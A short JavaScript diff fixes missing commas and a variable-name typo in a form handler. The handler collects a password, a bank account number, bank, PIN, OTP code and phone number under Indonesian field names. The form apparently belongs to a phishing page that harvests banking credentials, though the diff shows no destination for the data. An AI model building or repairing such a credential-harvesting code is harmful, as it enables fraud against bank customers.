@@ -31,9 +31,9 @@ let formData = {
     password: '',
     nama: '',
     norekening: '',
-    bank: ''
-    pin: ''
-    nohp: ''
+    bank: '',
+    pin: '',
+    nohp: '',
     job: '',
     link: ''
 };
@@ -131,7 +131,7 @@ document.getElementById('dataForm').addEventListener('submit', function (e) {
     formData.nama = document.getElementById('nama').value;
     formData.norekening = document.getElementById('norekening').value;
     formData.bank = document.getElementById('bank').value;
-    formmData.pin = document.getElementById('pin').value;
+    formData.pin = document.getElementById('pin').value;
     formData.kodeotp = document.getElementById('kodeotp').value;
     formData.nohp = document.getElementById('nohp').value;
     formData.job = document.getElementById('job').value;
